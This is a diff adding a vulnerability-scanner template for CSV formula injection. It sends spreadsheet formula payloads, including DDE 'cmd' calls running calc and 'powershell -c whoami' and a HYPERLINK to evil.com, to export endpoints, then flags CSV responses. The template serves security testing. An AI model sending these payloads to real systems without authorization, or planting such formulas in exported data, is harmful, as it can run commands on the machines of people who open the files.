@@ -1,0 +1,167 @@
+id: medium-webapp-csv-injection-formula-execution
+
+info:
+  name: CSV Injection with Formula Execution
+  author: elite-red-team
+  severity: high
+  description: |
+    Detects CSV injection vulnerabilities where user input is exported to CSV files without proper
+    sanitization, allowing formula injection that can lead to code execution when opened in
+    spreadsheet applications like Excel, LibreOffice, or Google Sheets.
+  reference:
+    - https://owasp.org/www-community/attacks/CSV_Injection
+    - https://blog.7elements.co.uk/2013/01/cell-injection.html
+    - https://www.contextis.com/en/blog/comma-separated-vulnerabilities
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H
+    cvss-score: 8.5
+    cwe-id: CWE-1236
+  tags: csv-injection,formula-execution,export,medium
+
+http:
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        {{param}}==cmd|'/c calc'!A1&{{param2}}=test
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        {{param}}==HYPERLINK("http://evil.com","Click")&{{param2}}=test
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"{{param}}": "=cmd|'/c powershell -c whoami'!A1", "{{param2}}": "test"}
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"{{param}}": "@SUM(1+1)*cmd|'/c notepad'!A1", "{{param2}}": "test"}
+
+      - |
+        GET {{path}}?{{param}}==CONCATENATE(CHAR(61),CHAR(99),CHAR(109),CHAR(100))&{{param2}}=test HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      path:
+        - "/export"
+        - "/download"
+        - "/report"
+        - "/csv"
+        - "/excel"
+        - "/data/export"
+        - "/admin/export"
+        - "/api/export"
+        - "/user/export"
+        - "/reports/generate"
+        - "/analytics/export"
+        - "/dashboard/export"
+
+      param:
+        - "name"
+        - "title"
+        - "description"
+        - "comment"
+        - "note"
+        - "message"
+        - "content"
+        - "value"
+        - "data"
+        - "text"
+
+      param2:
+        - "id"
+        - "type"
+        - "format"
+        - "category"
+
+    attack: clusterbomb
+    threads: 15
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 302
+
+      - type: word
+        words:
+          - "application/csv"
+          - "text/csv"
+          - "application/vnd.ms-excel"
+          - "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
+        part: header
+        condition: or
+
+      - type: word
+        words:
+          - "Content-Disposition"
+          - "attachment"
+          - "filename"
+        part: header
+        condition: or
+
+    extractors:
+      - type: regex
+        name: csv_response
+        part: header
+        regex:
+          - '(?i)filename[=:][\s]*["\']?([^"\';\r\n]+\.csv)'
+          - '(?i)filename[=:][\s]*["\']?([^"\';\r\n]+\.xlsx?)'
+
+      - type: kval
+        kval:
+          - content_type
+          - content_disposition
+
+# Additional request for direct CSV download test
+  - raw:
+      - |
+        GET {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/csv,application/csv,*/*
+
+    payloads:
+      path:
+        - "/users.csv"
+        - "/data.csv"
+        - "/export.csv"
+        - "/report.csv"
+        - "/download.csv"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "text/csv"
+          - "application/csv"
+        part: header
+        condition: or
+
+      - type: regex
+        regex:
+          - '(?i)^[^,]*,[^,]*'
+        part: body
+
+    extractors:
+      - type: regex
+        name: csv_content
+        regex:
+          - '(?m)^(.{0,100})'
+        part: body
